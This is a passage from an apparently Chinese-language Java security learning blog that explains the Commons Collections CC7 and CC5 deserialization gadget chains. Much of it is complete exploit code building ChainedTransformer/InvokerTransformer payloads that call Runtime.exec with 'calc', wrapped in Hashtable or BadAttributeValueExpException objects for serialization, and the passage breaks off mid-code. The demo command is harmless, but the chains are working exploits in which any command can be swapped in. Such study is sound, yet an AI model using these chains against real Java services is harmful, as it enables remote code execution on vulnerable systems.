之后需要在map2<code>remove()</code> 掉 yy因为 <code>HashTable.put()</code> 也会调用到 <code>equals()</code> 方法，当调用完 <code>equals()</code> 方法后，LazyMap2 的 key 中就会增加一个 yy 键，序列化的时候没问题如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091353231.png" alt="image-20230709135354102"><br>但是反序列化<code>m.size()</code>就会变为2但是原本的size还是1<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091354645.png" alt="image-20230709135419679"><br>然后就直接false了不会进入到get方法那么也就不会命令执行了，所以我们在进入for循环后就需要移除yy，最后避免本地序列化会弹计算器的干扰在序列化的过程修改为常数，因为Hashtable#put 中也会调用到 AbstractMap#equals 从而触发 LazyMap#get，然后反序列化的时候通过反射修改回来就行<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);  </span><br><span class="line">        decorateMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);  </span><br><span class="line">        decorateMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);  </span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();  </span><br><span class="line">        hashtable.put(decorateMap1, <span class="number">1</span>);  </span><br><span class="line">        hashtable.put(decorateMap2, <span class="number">1</span>);  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> ChainedTransformer.class;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(chainedTransformer, transformers);  </span><br><span class="line">        decorateMap2.remove(<span class="string">&quot;yy&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        serialize(hashtable);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091354569.png" alt="image-20230709135450394"></li></ul><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p>这条链子跟的比较难受，中途我idea调试的时候出现了玄学问题，不管怎么我怎么弄Hashtable这个类，弄了半天没弄好中间有事儿去了没弄了，等我第二天来调发现突然又好了但是此时思路没有一开始那么清晰了，我也懒得再重新分析了以后刷题的时候再弄一下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091355993.png" alt="image-20230709135500947"></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java学习之CC链5</title>
      <link href="/undefined/29398.html"/>
      <url>/undefined/29398.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>commons-collections版本如下，这里我一直参考的博客没说，但如果是4.0的话是有问题的后面会提到，其它环境没变</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;3.2.1&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>CC5就是改了入口点然后和CC1的LazyMap连接起来，组长后面两条链子没有详细讲了，因为大同小异，这里直接给了入口类，因为这条链子自己去找还是比较困难的，为<code>BadAttributeValueExpException</code> 的 <code>readObject()</code>方法，然后要和<code>LazyMap.get()</code>连上，那么就是找谁调用了<code>get()</code>方法这里如果去find usages去找的话很麻烦，调用实在太多了就直接看吧，最后是找到了<code>TiedMapEntry</code>类的<code>getValue()</code>方法调用了<code>LazyMap.get()</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091343468.png" alt="image-20230709134237186"><br>这里的map就是<code>LazyMap</code>的对象，我们在给TiedMapEntry类实例化的时候会传<code>LazyMap</code>，而这个类的<code>toString()</code>方法调用了<code>getValue()</code>方法，接下来就是把<code>TiedMapEntry</code>类的<code>toString()</code>方法和入口类<code>BadAttributeValueExpException</code> 的 <code>readObject()</code>方法连起来这条链子就完成了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091343096.png" alt="image-20230709134339935"><br>发现readObject方法这里<code>valObj</code>调用了<code>toString()</code>方法，想办法让<code>valObj</code>变为<code>TiedMapEntry</code>类的对象就行了，先看一下它的初始化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();  </span><br><span class="line"><span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>那么其实<code>valObj</code>就是<code>val</code>而<code>val</code>就是<code>BadAttributeValueExpException</code> 类中直接定义的<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091344942.png" alt="image-20230709134416810"><br>那么通过反射修改就行了，再来看为什么<code>BadAttributeValueExpException</code> 类可以反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadAttributeValueExpException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>   &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exception</span> <span class="keyword">extends</span> <span class="title class_">Throwable</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Throwable</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br></pre></td></tr></table></figure><p>至此链子分析就结束了</p><h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><p>后面的命令执行CC1的LazyMap可以用所以直接拿过来就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">LazyMapget</span> <span class="operator">=</span> lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        LazyMapget.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        LazyMapget.invoke(decorateMap,chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091344744.png" alt="image-20230709134433612"><br>执行成功，在这里我发现commons-collections版本得用3.2.1不然下面这个地方就会报错<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091347346.png" alt="image-20230709134754280"><br>因为在<code>commons-collections 4.0</code>版本LazyMap里面没有这个方法<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307091344900.png" alt="image-20230709134451829"><br>那么接下来就得把<code>TiedMapEntry</code>类和<code>LazyMap</code>类连起来，那么先看一看这个类的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(<span class="keyword">final</span> Map&lt;K, V&gt; map, <span class="keyword">final</span> K key)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();  </span><br><span class="line">    <span class="built_in">this</span>.map = map;  </span><br><span class="line">    <span class="built_in">this</span>.key = key;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个public类那么调用就更加简单了，所以这里只需要把LazyMap的对象decorateMap传入即可，如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        tiedMapEntry.toString();  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在就是和入口类连起来，<code>BadAttributeValueExpException</code> 的作用域是public所以直接new一个对象就行，如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>然后就是让<code>val</code>变为<code>TiedMapEntry</code>的对象，因为这个变量是私有的所以利用反射修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);  </span><br><span class="line"><span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);  </span><br><span class="line">declaredField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">declaredField.set(badAttributeValueExpException,tiedMapEntry);</span><br></pre></td></tr></table></figure><p>到这里就结束了，完整EXP如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorateMap, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);  </span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        declaredField.set(badAttributeValueExpException,tiedMapEntry);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        serialize(badAttributeValueExpException);  </span></span><br><span class="line">      unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span 